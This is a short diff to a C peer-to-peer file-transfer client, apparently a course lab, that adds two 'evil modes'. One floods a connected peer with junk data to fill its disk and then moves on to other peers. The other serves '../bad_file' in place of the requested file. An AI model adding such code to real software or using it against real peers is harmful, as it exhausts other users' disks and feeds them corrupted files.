@@ -566,6 +566,17 @@ static void task_download(task_t *t, task_t *tracker_task)
 	}
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
+	// 3B Evil mode 1
+	// Instead of reading and copying, we are continuously writing bad data over peer's file. 
+	if (evil_mode == 1)
+	{
+		while (write(t->peer_fd, "bad_data", 8) > 0) continue;
+		message("* Target Peer's disk is now full.");
+
+		//now attack other peer's with the same file. 
+		goto try_again;
+	}
+
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
 	// "foo.txt~1~".  However, if there are 50 local files, don't download
@@ -735,7 +746,14 @@ static void task_upload(task_t *t)
 			goto exit;
         }
 
-	t->disk_fd = open(t->filename, O_RDONLY);
+
+    // 3 evil_mode 2. Instead of uploading the requested file, upload a bad file we specify
+    if (evil_mode == 2)   
+    	t->disk_fd = open("../bad_file", O_RDONLY);
+	else
+		t->disk_fd = open(t->filename, O_RDONLY);
+
+
 	if (t->disk_fd == -1) {
 		error("* Cannot open file %s", t->filename);
 		goto exit;
